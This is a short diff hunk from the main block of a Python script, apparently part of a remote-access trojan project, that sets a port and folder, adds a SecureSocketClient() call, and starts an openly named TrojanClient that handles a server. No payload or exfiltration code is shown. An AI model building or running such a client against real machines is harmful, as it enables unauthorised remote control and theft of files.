@@ -142,5 +142,6 @@ if __name__ == "__main__":
     PORT = 44444
     FOLDER = "D:\check"
 
+    SecureSocketClient()
     client = TrojanClient(HOST, PORT, FOLDER)
     client.handle_server()
